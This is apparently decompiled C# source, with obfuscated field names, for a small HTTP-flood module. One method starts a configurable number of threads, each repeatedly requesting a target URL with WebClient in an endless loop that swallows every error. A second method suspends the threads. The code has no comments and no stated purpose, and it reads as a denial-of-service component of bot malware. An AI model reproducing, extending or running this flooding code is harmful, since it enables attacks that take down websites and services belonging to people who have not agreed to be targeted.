using System.Net;
using System.Threading;

namespace ns0;

internal class Class13
{
	private class Class14
	{
		private string eqwrtwetrwert;

		private WebClient cvbxcbvxcvb = new WebClient();

		public Class14(string string_0)
		{
			eqwrtwetrwert = string_0;
		}

		public void method_0()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						cvbxcbvxcvb.DownloadString(eqwrtwetrwert);
					}
				}
				catch
				{
				}
			}
		}
	}

	private static ThreadStart[] bvnmnvnbnmvbnmvb;

	private static Thread[] bxcvbxcvbxcvb;

	public static string vbnmvbnmvbnmbvnm;

	private static Class14[] fgjfghjfhfhf;

	public static int adgdsfgsdgdf;

	public static void smethod_0()
	{
		bxcvbxcvbxcvb = new Thread[adgdsfgsdgdf];
		bvnmnvnbnmvbnmvb = new ThreadStart[adgdsfgsdgdf];
		fgjfghjfhfhf = new Class14[adgdsfgsdgdf];
		for (int i = 0; i < adgdsfgsdgdf; i++)
		{
			fgjfghjfhfhf[i] = new Class14(vbnmvbnmvbnmbvnm);
			bvnmnvnbnmvbnmvb[i] = fgjfghjfhfhf[i].method_0;
			bxcvbxcvbxcvb[i] = new Thread(bvnmnvnbnmvbnmvb[i]);
			bxcvbxcvbxcvb[i].Start();
		}
	}

	public static void smethod_1()
	{
		for (int i = 0; i < adgdsfgsdgdf; i++)
		{
			try
			{
				bxcvbxcvbxcvb[i].Suspend();
			}
			catch
			{
			}
		}
	}
}
